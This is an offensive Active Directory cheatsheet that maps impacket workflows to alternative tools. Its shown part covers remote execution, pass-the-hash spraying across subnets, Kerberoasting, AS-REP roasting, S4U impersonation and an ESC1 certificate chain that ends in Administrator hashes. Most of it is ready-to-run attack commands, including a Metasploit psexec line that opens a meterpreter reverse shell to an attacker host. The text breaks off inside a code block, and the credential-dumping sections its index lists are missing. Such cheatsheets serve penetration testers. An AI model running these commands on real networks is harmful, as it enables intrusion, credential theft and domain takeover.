# 📦 Outpacket

> **Tired of impacket?** This cheatsheet maps common impacket workflows to their modern alternatives
---

## Index

- [Auth Quick Reference](#auth-quick-reference)
- [1. Remote Execution](#1-remote-execution)
  - [WMI Exec](#wmi-exec) · `wmiexec.py`
  - [DCOM Exec](#dcom-exec) · `dcomexec.py`
  - [Service-Based Exec](#service-based-exec-smbexec--psexec) · `smbexec.py` · `psexec.py`
  - [Scheduled Task Exec](#scheduled-task-exec) · `atexec.py`
  - [Bulk Execution](#bulk-remote-execution-across-hosts) · `wmiexec.py` · `psexec.py`
- [2. Kerberos](#2-kerberos)
  - [Request TGT](#request-a-tgt) · `getTGT.py`
  - [Request TGS](#request-a-service-ticket-tgs) · `getST.py`
  - [S4U2self / S4U2proxy](#s4u2self--s4u2proxy) · `getST.py -impersonate`
  - [Kerberoasting](#kerberoasting) · `GetUserSPNs.py`
  - [AS-REP Roasting](#as-rep-roasting) · `GetNPUsers.py`
  - [ccache Roasting](#ccache-roasting-offline)
  - [Pre-Auth / Enc-Type Probe](#pre-auth--enc-type-probe) · `GetNPUsers.py`
  - [PKINIT NT Hash Recovery](#pkinit-nt-hash-recovery-unpac)
  - [Ticket Renewal](#ticket-renewal) · `getST.py -renew`
  - [Ticket Format Conversion](#ticket-format-conversion) · `ticketConverter.py`
  - [Change Password](#change-password) · `changepasswd.py`
  - [Golden / Silver Ticket](#golden--silver-ticket) · `ticketer.py`
- [3. SMB / File Operations](#3-smb--file-operations)
  - [List Shares](#list-shares) · `smbclient.py -shares` · `asmbshareenum`
  - [Browse / List Files](#browse--list-files) · `smbclient.py` · `asmbclient`
  - [Download a File](#download-a-file) · `smbclient.py get` · `asmbgetfile`
  - [Download with Backup Semantics](#download-with-backup-semantics)
  - [Upload a File](#upload-a-file) · `smbclient.py put`
  - [Create / Remove Directories and Files](#create--remove-directories-and-files) · `smbclient.py`
  - [List Named Pipes](#list-named-pipes) · `smbclient.py`
  - [Pass the Hash — SMB](#pass-the-hash--smb) · `smbclient.py -hashes` · `asmbclient`
  - [SMB over SOCKS5](#smb-over-socks5) · `proxychains smbclient.py` · `asmbclient`
  - [Enumerate Open Files / Sessions](#enumerate-open-files--sessions) · `netview.py` · `asmbclient`
  - [Remote File Timestomping](#remote-file-timestomping)
  - [VSS Snapshot Enumeration](#vss-snapshot-enumeration) · `smbclient.py list_snapshots`
  - [NTFS Alternate Data Streams](#ntfs-alternate-data-stream-ads-enumeration)
  - [Server NIC Enumeration](#server-nic-enumeration)
  - [Bulk Share Enumeration](#bulk-share-enumeration) · `smbclient.py` · `asmbscanner`
- [4. Credential Dumping](#4-credential-dumping)
  - [LSASS Minidump Parsing](#lsass-minidump-parsing-offline)
  - [Dump SAM Hashes](#dump-sam-hashes) · `secretsdump.py -sam`
  - [Dump LSA Secrets](#dump-lsa-secrets) · `secretsdump.py -lsa`
  - [Dump SAM + LSA Together](#dump-sam--lsa-together) · `secretsdump.py`
  - [Bulk SAM / LSA Dump](#bulk-sam--lsa-dump-across-hosts) · `secretsdump.py`
  - [NTDS Dump via VSS Snapshot](#ntds-dump-via-vss-snapshot) · `secretsdump.py -use-vss`
  - [NTDS Dump via IFM](#ntds-dump-via-ifm-ntdsutil) · `wmiexec.py` · `smbclient.py`
  - [NTDS Dump via wbadmin](#ntds-dump-via-wbadmin-windows-server-backup) · `wmiexec.py`
  - [NTDS Dump via Diskshadow](#ntds-dump-via-diskshadow) · `wmiexec.py` · `smbclient.py`
  - [NTDS Dump via Kerb-Key-List](#ntds-dump-via-kerb-key-list-rodc) · `secretsdump.py -use-keylist`
  - [NTDS Offline Parsing](#ntds-offline-parsing) · `secretsdump.py`
  - [DCSync](#dcsync) · `secretsdump.py -just-dc-ntlm`
- [5. Enumeration](#5-enumeration)
  - [Domain Users (SAMR)](#enumerate-domain-users-samr) · `samrdump.py` · `net.py`
  - [Groups / Local Aliases](#enumerate-groups--local-aliases) · `net.py group` · `net.py localgroup`
  - [SID Brute Force / Lookup](#sid-brute-force--lookup) · `lookupsid.py`
  - [RPC Endpoints](#enumerate-rpc-endpoints) · `rpcdump.py` · `rpcmap.py`
  - [Query WMI](#query-wmi) · `wmiquery.py`
  - [WMI Method Invocation](#wmi-method-invocation) · `wmiexec.py`
  - [Remote Registry](#remote-registry-operations) · `reg.py`
  - [Registry Key Security Descriptor](#registry-key-security-descriptor)
  - [Service Enumeration](#service-enumeration) · `services.py`
  - [LSA Privilege Management](#lsa-privilege-management)
  - [LSA Privilege and Account Enumeration](#lsa-privilege-and-account-enumeration)
- [6. Active Directory / LDAP](#6-active-directory--ldap)
  - [Enumerate AD Users / Computers](#enumerate-ad-users--computers) · `GetADUsers.py` · `GetADComputers.py`
  - [GPO and Domain Trust Enumeration](#gpo-and-domain-trust-enumeration) · `ldapsearch` · `bloodyAD`
  - [Find Delegation Configurations](#find-delegation-configurations) · `findDelegation.py`
  - [Add a Computer Account](#add-a-computer-account) · `addcomputer.py`
  - [Add a User Account](#add-a-user-account) · `net.py user -add`
  - [Set RBCD](#set-rbcd) · `rbcd.py`
  - [DACL Abuse](#dacl-abuse) · `dacledit.py` · `owneredit.py`
  - [User Attribute Modification (UAC)](#user-attribute-modification-uac-bitflags) · `net.py`
- [7. Auth Coercion](#7-auth-coercion) · `printerbug.py` · `dfscoerce.py`
  - [Coerce + Relay Pattern](#coerce--relay-pattern) · `ntlmrelayx.py` · `smbserver.py` (capture)
- [8. Certificates](#8-certificates)
  - [Self-Signed PFX Generation](#self-signed-pfx-generation)
  - [ADCS Template Enumeration](#adcs-certificate-template-enumeration) · `netexec ldap -M adcs`
  - [ADCS ESC1](#adcs-esc1--enroll-and-recover-nt-hash) · `asmbcertreq`
- [9. Exotic Credential Harvest](#9-exotic-credential-harvest)
  - [certsync — Golden Cert + UnPAC the Hash](#certsync--golden-cert--unpac-the-hash)
  - [DPAPI Domain Backup Key — Mass Credential Decryption](#dpapi-domain-backup-key--mass-credential-decryption)

---

## Auth Quick Reference

| Scenario | impacket | Titanis | minikerberos URL | msldap URL | Metasploit | aiosmb URL |
|---|---|---|---|---|---|---|
| Password | `DOMAIN/user:Pass@host` | `-UserName user@DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
| Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos+ntlm-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
| AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos+aes://DOMAIN\user:hex@kdc` | `ldap+kerberos+aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos+aes://DOMAIN\user:hex@host/?dc=ip` |
| RC4 key | via `-hashes` | `-NtlmHash` | `kerberos+rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos+rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos+rc4://DOMAIN\user:NTLM@host/?dc=ip` |
| ccache | `KRB5CCNAME=file.ccache` | `-TicketCache file.ccache` | `kerberos+ccache://...?ccache=f.ccache` | `ldap+kerberos+ccache://.../?dc=ip&ccache=f.ccache` | `KrbUseCachedCredentials true` | `smb+kerberos+ccache://DOMAIN\user:@host/?dc=ip&ccache=f.ccache` |
| kirbi ticket | convert first | `-Ticket file.kirbi` | `minikerberos-kirbi2ccache` first | convert first | `auxiliary/admin/kerberos/ticket_converter` | convert to ccache first |
| PKINIT / PFX | certipy / gettgtpkinit | — | `kerberos+pfx://...?pfx=f.pfx&pfxpass=P` | `ldap+kerberos+pfx://.../?dc=ip&pfx=f.pfx` | — | `smb+kerberos+pfx://DOMAIN\user:@host/?dc=ip&pfx=f.pfx&pfxpass=P` |
| NEGOEX / PFX | — | — | n/a | n/a | — | `smb+negoex-pfx://cert.pfx:certpass@host/` |
| SOCKS5 | `proxychains` prefix | `-Socks5 host:port` | n/a | `?proxytype=socks5&proxyhost=...&proxyport=...` | `set Proxies socks5:127.0.0.1:1080` | `?proxyhost=127.0.0.1&proxyport=1080` |
| SOCKS4 | n/a | n/a | n/a | n/a | n/a | `?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080` |
| Encrypt RPC | n/a | `-EncryptRpc` | n/a | n/a | auto | n/a (SMB signing negotiated automatically) |
| Backup semantics | n/a | `-BackupSemantics` | n/a | n/a | n/a | n/a |
| Anonymous bind | limited | undocumented | n/a | `ldap://192.168.1.1` | n/a | n/a |
| QUIC (Azure) | n/a | n/a | n/a | n/a | n/a | `smb+quic+ntlm-password://DOMAIN\user:Pass@host` |

> **⚠️ Titanis ccache note:** `-Tgt` currently rejects ccache files generated by impacket (`getTGT.py`) and similar tools. Root cause: impacket encodes the TGT service principal as **NT_PRINCIPAL** (name type 1); Titanis expects **NT_SERVICE_INSTANCE** (name type 2) and fails to recognise the ticket as a TGT. A fix is pending from the Titanis developer to relax this check. Until then, use `Kerb asreq -TicketCache` to obtain a Titanis-native TGT and pass it via `-Tgt`. Separately, `-TicketCache` silently provides no auth context for non-native ccache files — use `-Tgt` (with a Titanis-generated file) instead. For impacket/Metasploit ccache files, use `KRB5CCNAME` + `wmiexec.py -k` / `smbclient.py -k` directly.

---

## 1. Remote Execution

### WMI Exec

```bash
# impacket
wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami"

# Titanis
Wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 "whoami"

# impacket — pass-the-hash
wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "ipconfig"

# NetExec — pass-the-hash
netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -x "ipconfig"

# Titanis — pass-the-hash
Wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN \
  -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 "ipconfig"

# impacket — Kerberos
wmiexec.py -k -no-pass DOMAIN/jdoe@dc01.domain.local "hostname"

# Titanis — Kerberos
# Use the short hostname as target (for Kerberos SPN + application protocol);
# use -ha for the actual TCP connection (IP or FQDN). FQDNs as the target fail
# because the server expects the short hostname in the WMI activation request.
Wmi exec dc01 -ha 192.168.1.10 -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"

# Titanis — Kerberos with ccache TGT (Titanis-generated only; see TicketCache note)
Wmi exec dc01 -ha 192.168.1.10 -Tgt /tmp/jdoe.ccache -Kdc 192.168.1.1 "hostname"
```

[↑ Back to Index](#index)

---

### DCOM Exec

> **Titanis `Dcom invoke` — CLSID lookup SOP:**
> - **ProgID resolution is local.** Titanis resolves ProgIDs (e.g., `MMC20.Application`) from the attacker's registry, not the target's. From Linux there is no registry to resolve against; from Windows the attacker's CLSID may differ from the target's. Always use `Reg` to look up the actual CLSID on the remote system, then pass the raw GUID.
> - **Single-hop IDispatch only.** Titanis calls `IDispatch::GetIDsOfNames` on the root activation object and does not traverse dotted property chains. The three commonly documented exec CLSIDs all bury their exec method behind multi-hop access and will return `DISP_E_MEMBERNOTFOUND` (0x80020003):
>   - `MMC20.Application` → `Document.ActiveView.ExecuteShellCommand`
>   - `ShellBrowserWindow` → `Document.Application.ShellExecute`
>   - `ShellWindows` → `Item.Document.Application.ShellExecute`
> - A CLSID whose exec method is directly on the root IDispatch object will work. Finding one requires enumeration on the target.

```bash
# impacket
dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"

# impacket — pass-the-hash
dcomexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "whoami"

# impacket — explicit CLSID (default is MMC20.Application; ShellWindows or ShellBrowserWindow also work)
dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellWindows
dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellBrowserWindow

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec

# Titanis — Step 1: look up CLSID on the remote system
# Titanis Reg list cannot read unnamed (default) registry values — use wmiexec for this step
wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 \
  'reg query HKCR\\MMC20.Application\\CLSID /ve'
# → (Default)    REG_SZ    {49B2791A-B1AE-4C90-9B8E-E860BA07F889}

# Step 2 (optional): inspect the CLSID entry on the remote system to confirm AppID/auth level
Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  'HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'

# Step 3: invoke with raw GUID
# Note: exec method must be at the root IDispatch level — standard exec CLSIDs fail (multi-hop)
Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  '{49B2791A-B1AE-4C90-9B8E-E860BA07F889}' MethodName arg1 arg2
```

[↑ Back to Index](#index)

---

### Service-Based Exec (smbexec / psexec)

> **⚠️ `smbexec.py` against DCs:** `smbexec.py` fails against Domain Controllers with `STATUS_OBJECT_NAME_NOT_FOUND` when opening `\pipe\svcctl`. DCs are stricter about named pipe open parameters than member servers — smbexec's flags are rejected where `services.py`'s are not. Use `services.py` for service management on DCs, or `wmiexec.py` for remote execution.

```bash
# impacket — smbexec (interactive semi-shell; works against member servers)
smbexec.py DOMAIN/jdoe:Password123@192.168.1.10

# impacket — psexec
psexec.py DOMAIN/jdoe:Password123@192.168.1.10 cmd.exe

# Metasploit — password
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
  smbpass=Password123 payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>

# Metasploit — pass-the-hash
msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
  smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>

# Titanis — create service, retrieve output, clean up
Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
  "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
Scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
```

[↑ Back to Index](#index)

---

### Scheduled Task Exec

> **Note:** MS-TSCH is not yet implemented in Titanis. Use `Win32_ScheduledJob` via WMI as a workaround, or `atexec.py` for true MS-TSCH semantics.

```bash
# Titanis — create immediate scheduled task via Win32_ScheduledJob
Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
  Win32_ScheduledJob Create \
  "Command='cmd /c whoami > C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"

# Titanis — retrieve output and clean up
Smb2Client get \\192.168.1.10\C$\Windows\Temp\out.txt out.txt \
  -UserName jdoe@DOMAIN -Password Password123
Smb2Client rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
  -UserName jdoe@DOMAIN -Password Password123

# impacket — true MS-TSCH (creates, runs, and cleans up automatically)
atexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami > C:\Windows\Temp\out.txt"

# impacket — pass-the-hash
atexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 \
  "whoami > C:\Windows\Temp\out.txt"

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method atexec
```

[↑ Back to Index](#index)

---

### Bulk Remote Execution Across Hosts

```bash
# NetExec — spray across a subnet
netexec smb 192.168.1.0/24 -u jdoe -p Password123 -x "whoami"

# NetExec — pass-the-hash spray
netexec smb 192.168.1.0/24 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -x "whoami"

# Titanis — loop over a host list
while IFS= read -r host; do
  echo "=== $host ===" >> exec_results.txt
  wmi exec "$host" -UserName jdoe@DOMAIN -Password Password123 \
    "whoami /all" >> exec_results.txt 2>&1
done < hosts.txt
```

[↑ Back to Index](#index)

---

## 2. Kerberos

### Request a TGT

```bash
# impacket — password
getTGT.py DOMAIN/jdoe:Password123 -dc-ip 192.168.1.1

# minikerberos — password
minikerberos-getTGT "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" --ccache jdoe.ccache

# Titanis — password (outputs kirbi)
Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# Metasploit
msf6 > use auxiliary/admin/kerberos/get_ticket
msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdoe \
  password=Password123 action=GET_TGT

# impacket — NTLM hash
getTGT.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe -dc-ip 192.168.1.1

# minikerberos — NTLM hash
minikerberos-getTGT "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" --ccache jdoe.ccache

# Titanis — NTLM hash
Kerb asreq -UserName jdoe -Realm DOMAIN -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# impacket — AES256
getTGT.py -aesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 DOMAIN/jdoe

# minikerberos — AES256
minikerberos-getTGT \
  "kerberos+aes://DOMAIN\jdoe:76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4@192.168.1.1" \
  --ccache jdoe.ccache

# Titanis — AES256
Kerb asreq -UserName jdoe -Realm DOMAIN \
  -AesKey 76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi

# certipy — PKINIT
certipy auth -pfx jdoe.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL

# minikerberos — PKINIT (also recovers NT hash via UnPAC)
minikerberos-getTGT \
  "kerberos+pfx://DOMAIN\jdoe:@192.168.1.1?pfx=jdoe.pfx&pfxpass=Password123" \
  --ccache jdoe.ccache

# Titanis — explicit RC4
Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -EncTypes Rc4Hmac -Kdc 192.168.1.1 -OutputFileName jdoe-tgt-rc4.kirbi
```

[↑ Back to Index](#index)

---

### Request a Service Ticket (TGS)

```bash
# impacket
getST.py -spn cifs/fileserver.domain.local -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123

# Metasploit
msf6 auxiliary(get_ticket) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL user=jdoe \
  password=Password123 spn=cifs/fileserver.domain.local action=GET_TGS

# minikerberos (requires existing ccache)
minikerberos-getTGS \
  "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" \
  cifs/fileserver.domain.local fileserver.ccache

# Titanis
Kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
  cifs/fileserver.domain.local -OutputFile jdoe-fileserver.kirbi
```

[↑ Back to Index](#index)

---

### S4U2self / S4U2proxy

```bash
# impacket — S4U2self + S4U2proxy in one call
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -dc-ip 192.168.1.1 DOMAIN/svc:Password123

# impacket — pass-the-hash
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/svc

# minikerberos — S4U2self
minikerberos-getS4U2self \
  "kerberos+password://DOMAIN\svc$:Password123@192.168.1.1" \
  Administrator@DOMAIN.LOCAL s4u_self.ccache

# minikerberos — S4U2proxy
minikerberos-getS4U2proxy \
  "kerberos+password://DOMAIN\svc$:Password123@192.168.1.1" \
  cifs/target.domain.local s4u_self.ccache s4u_proxy.ccache

# Titanis — combined self+proxy
Kerb tgsreq -Kdc 192.168.1.1 -Tgt svc-tgt.kirbi \
  -S4UserName Administrator@DOMAIN cifs/target.domain.local \
  -OutputFile admin-target.kirbi
```

[↑ Back to Index](#index)

---

### Kerberoasting

```bash
# impacket
GetUserSPNs.py -dc-ip 192.168.1.1 -request DOMAIN/jdoe:Password123

# Metasploit
msf6 > use auxiliary/gather/get_user_spns
msf6 auxiliary(get_user_spns) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user=jdoe pass=Password123

# Metasploit — pass-the-hash
msf6 auxiliary(get_user_spns) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user=jdoe nthash=A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --kerberoasting kerberoast.txt

# minikerberos
minikerberos-kerberoast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
  kerberoast_hashes.txt

# minikerberos — NTLM hash
minikerberos-kerberoast "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
  kerberoast_hashes.txt

# pypykatz
pypykatz kerberos spnroast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
  -o kerberoast_hashes.txt

# pypykatz — NTLM hash
pypykatz kerberos spnroast \
  "kerberos+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.1" \
  -o kerberoast_hashes.txt

# msldap
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> kerberoast kerberoast_hashes.txt

# Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
# Use Ldap query (not Ldap search) — requires -FollowReferrals on Linux
# -OutputFields takes one field at a time on Linux; use -OutputStyle List to get multiple attrs
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(servicePrincipalName=*)" -OutputFields servicePrincipalName \
  -OutputStyle List -FollowReferrals 2>/dev/null \
  | awk '/^servicePrincipalName:/{print $2}' > spns.txt
Kerb asreq -UserName jdoe -Realm DOMAIN -Password Password123 \
  -Kdc 192.168.1.1 -OutputFileName jdoe-tgt.kirbi
while IFS= read -r spn; do
  safe=$(echo "$spn" | tr '/:@' '_')
  kerb tgsreq -Kdc 192.168.1.1 -Tgt jdoe-tgt.kirbi \
    -EncTypes Rc4Hmac "$spn" -OutputFile "roast_${safe}.kirbi"
done < spns.txt
Kerb select -From roast_*.kirbi -Into kerberoast-all.ccache
minikerberos-ccacheroast kerberoast-all.ccache
```

[↑ Back to Index](#index)

---

### AS-REP Roasting

```bash
# impacket — no credentials required
GetNPUsers.py -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN/

# Metasploit
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user_file=/path/to/users.txt

# NetExec
netexec ldap 192.168.1.1 -u jdoe -p Password123 --asreproast asrep.txt

# pypykatz — no credentials required, userlist
pypykatz kerberos asreproast "kerberos+password://DOMAIN\@192.168.1.1" \
  --userlist users.txt -o asrep_hashes.txt

# pypykatz — authenticated, auto-discover targets via LDAP
pypykatz kerberos asreproast "kerberos+password://DOMAIN\jdoe:Password123@192.168.1.1" \
  --ldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1" -o asrep_hashes.txt

# minikerberos — userlist (no credentials required)
# syntax: minikerberos-asreproast <server_ip> <domain> [user | @userlist.txt]
minikerberos-asreproast 192.168.1.1 DOMAIN @users.txt

# minikerberos — NTLM hash auth (enumerate via LDAP, then roast)
# Pass individual username or @file; no URL arg — server+domain are positional
minikerberos-asreproast 192.168.1.1 DOMAIN @users.txt

# msldap (enumerate targets only — no hash capture)
msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
# msldap> asrep

# Titanis — find targets via LDAP, loop asreq
# Note: -FollowReferrals required on Linux — default behavior prints referral as INFO and returns no records
Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
  "(userAccountControl|=4194304)" \
  -OutputFields sAMAccountName -FollowReferrals > asrep_targets.txt
while IFS= read -r user; do
  kerb asreq -UserName "$user" -Realm DOMAIN \
    -Kdc 192.168.1.1 -EncTypes Rc4Hmac \
    -OutputFileName "asrep_${user}.kirbi" 2>/dev/null
done < <(awk '/sAMAccountName:/{print $2}' asrep_targets.txt)
```

[↑ Back to Index](#index)

---

### ccache Roasting (offline)

Extracts `$krb5tgs$` hashes from stolen ccache files without re-requesting anything.

```bash
# minikerberos
minikerberos-ccacheroast stolen.ccache

# pypykatz
pypykatz kerberos ccache roast stolen.ccache

# Feed output to: hashcat -m 13100  or  john --format=krb5tgs
```

[↑ Back to Index](#index)

---

### Pre-Auth / Enc-Type Probe

```bash
# kerbrute — enumerate valid accounts (no credentials)
kerbrute userenum -d DOMAIN --dc 192.168.1.1 users.txt

# pypykatz — enumerate valid accounts (no credentials)
pypykatz kerberos brute "kerberos+password://DOMAIN\@192.168.1.1" users.txt

# impacket — shows no-preauth accounts only
GetNPUsers.py -dc-ip 192.168.1.1 -no-pass -usersfile users.txt DOMAIN/

# Metasploit — classifies valid / disabled / no-preauth
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 auxiliary(kerberos_enumusers) > run rhosts=192.168.1.1 domain=DOMAIN.LOCAL \
  user_file=/path/to/users.txt verbose=true

# Titanis — single account probe
Kerb getasinfo -UserName jdoe -Realm DOMAIN -Kdc 192.168.1.1

# Titanis — bulk probe loop
while IFS= read -r user; do
  result=$(kerb getasinfo -UserName "$user" -Realm DOMAIN -Kdc 192.168.1.1 2>&1)
  if echo "$result" | grep -q "PRINCIPAL_UNKNOWN\|does not exist"; then
    echo "INVALID: $user"
  elif echo "$result" | grep -q "preauth.*false\|DONT_REQ_PREAUTH"; then
    echo "NO-PREAUTH: $user"
  else
    echo "VALID: $user"
  fi
done < users.txt
```

[↑ Back to Index](#index)

---

### PKINIT NT Hash Recovery (UnPAC)

Recovers an account's NT hash via PKINIT after obtaining a certificate.

```bash
# certipy — certificate → NT hash + TGT (most direct; also outputs ccache)
certipy auth -pfx targetuser.pfx -dc-ip 192.168.1.1 -domain DOMAIN.LOCAL

# certipy — specify username explicitly (useful when UPN in cert differs)
certipy auth -pfx admin.pfx -username Administrator -domain DOMAIN.LOCAL \
  -dc-ip 192.168.1.1

# minikerberos — certificate → NT hash only
minikerberos-getNTPKInit \
  "kerberos+pfx://DOMAIN\targetuser:@192.168.1.1?pfx=targetuser.pfx" \
  targetuser_nt.txt

# PKINITtools — gettgtpkinit.py: PFX → TGT ccache + prints AS-REP enc key
python gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass Password123 \
  -dc-ip 192.168.1.1 DOMAIN/targetuser targetuser.ccache

# PKINITtools — getnthash.py: TGT ccache + AS-REP enc key → NT hash
# (run after gettgtpkinit.py; use the AS-REP key printed by that tool)
export KRB5CCNAME=targetuser.ccache
python getnthash.py -key <asrep-enc-key-hex> DOMAIN/targetuser

# Full chain: certipy ESC1 → PFX → minikerberos UnPAC → NT hash → Titanis PTH
certipy req -username jdoe@DOMAIN -password Password123 \
  -ca CA-NAME -template VulnerableTemplate \
  -upn Administrator@DOMAIN.LOCAL \
  -target ca.domain.local -out admin
minikerberos-getNTPKInit \
  "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
Wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
```

[↑ Back to Index](#index)

---

### Ticket Renewal

```bash
# impacket
export KRB5CCNAME=jdoe.ccache
getST.py -k -no-pass -renew -spn krbtgt/DOMAIN.LOCAL -dc-ip 192.168.1.1 DOMAIN/jdoe

# MIT Kerberos
kinit -R
krenew -v -b -t

# minikerberos
minikerberos-renewTGT "kerberos+ccache://DOMAIN\jdoe:@192.168.1.1?ccache=jdoe.ccache" jdoe-renewed.ccache

# Titanis
Kerb renew -Ticket jdoe-tgt.kirbi -OutputFileName jdoe-tgt-renewed.kirbi
```

[↑ Back to Index](#index)

---

### Ticket Format Conversion

```bash
# impacket
ticketConverter.py jdoe.ccache jdoe.kirbi
ticketConverter.py jdoe.kirbi  jdoe.ccache

# Metasploit
msf6 > use auxiliary/admin/kerberos/ticket_converter
msf6 auxiliary(ticket_converter) > run inputpath=jdoe.ccache outputpath=jdoe.kirbi

# Metasploit — inspect ticket (optionally decrypt)
msf6 > use auxiliary/admin/kerberos/inspect_ticket
msf6 auxiliary(inspect_ticket) > run ticket_path=jdoe.ccache nthash=A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# minikerberos
minikerberos-ccache2kirbi jdoe.ccache
minikerberos-kirbi2ccache jdoe.kirbi jdoe.ccache
minikerberos-ccacheedit list jdoe.ccache
minikerberos-ccacheedit delete jdoe.ccache <credential-index>

# Titanis — merge multiple files
Kerb select -From jdoe.ccache
